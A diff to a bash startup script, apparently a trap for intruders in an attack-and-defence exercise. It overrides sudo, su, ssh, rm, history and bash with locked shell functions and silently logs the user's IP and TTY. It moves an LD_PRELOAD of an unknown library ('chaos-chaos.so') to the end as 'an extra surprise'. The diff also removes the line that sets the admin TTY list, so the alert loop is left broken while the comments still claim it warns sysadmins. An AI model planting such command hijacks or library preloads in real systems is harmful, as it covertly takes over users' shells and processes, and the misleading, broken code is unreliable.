@@ -1,3 +1,6 @@
+# Restore PS1 and TERM variable
+export PS1="\u@\h \w \$ " TERM="xterm-256color"
+#
 # Helper function to warn sysadmins about intrusions
 PKGLOG="/var/tmp/install.log"
 warn() {
@@ -9,15 +12,12 @@ warn() {
 	#
 	# Silently gather the intruder's details
 	local IP="$(echo $SSH_CONNECTION | awk '{ print $1 }')"
-	local realUser="$(\logname)"
+	local realUser="$(builtin command logname)"
 	local redTTY="$(tty | awk -F'/dev/' '{ print $2 }')"
-	#
-	# Find all TTYs owned by a sysadmin
-	local blueTTYs=$(who | grep -E "^$SYSADS " | awk '{ print $2 }')
 	#
 	# Send the silent alert to every one of those TTYs
 	for blueTTY in $blueTTYs; do
-		printf "⚠️⚠️⚠️: $realUser ran ($@) via user $USER by remote connection ($IP) on TTY ($redTTY)." 2>/dev/null >> "$PKGLOG"
+		printf "⚠️⚠️⚠️: $realUser ran ($@) via user $USER by remote connection ($IP) on TTY ($redTTY).\n" 2>/dev/null >> "$PKGLOG"
 	done
 }
 #
@@ -118,7 +118,6 @@ set() {
 bash() {
 	su
 }
-export LD_PRELOAD=/var/lib/chaos-chaos.so
 readonly -f chpasswd sudo su ssh history rm warn bash env
 export -f chpasswd sudo su ssh history rm warn bash env
 readonly SSH_CONNECTION PKGLOG
@@ -150,5 +149,5 @@ function sessionLog() {
 sessionLog
 unset sessionLog
 #
-# Restore PS1 and TERM variable
-export PS1="\u@\h \w \$ " TERM="xterm-256color"
+# An extra surprise :3
+export LD_PRELOAD=/var/lib/chaos-chaos.so
